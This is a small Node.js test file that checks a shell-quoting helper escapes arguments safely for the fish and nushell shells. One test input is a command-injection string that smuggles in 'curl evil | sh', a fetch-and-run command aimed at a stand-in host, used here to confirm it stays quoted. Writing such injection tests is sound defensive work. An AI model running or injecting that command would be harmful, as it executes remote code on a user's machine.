const test = require('node:test');
const assert = require('node:assert/strict');

const { quoteArgForShell } = require('../shell-profiles');

test('quoteArgForShell keeps backslashes and quotes literal in fish', () => {
  assert.equal(quoteArgForShell('/opt/homebrew/bin/fish', "x\\' ; curl evil | sh ; echo '"), "'x\\\\\\' ; curl evil | sh ; echo \\''");
  assert.equal(quoteArgForShell('/opt/homebrew/bin/fish', 'ends in \\'), "'ends in \\\\'");
});

test('quoteArgForShell uses a raw string in nushell that the value cannot close', () => {
  assert.equal(quoteArgForShell('/usr/local/bin/nu', "it's"), "r#'it's'#");
  assert.equal(quoteArgForShell('/usr/local/bin/nu', "a'## b"), "r###'a'## b'###");
});
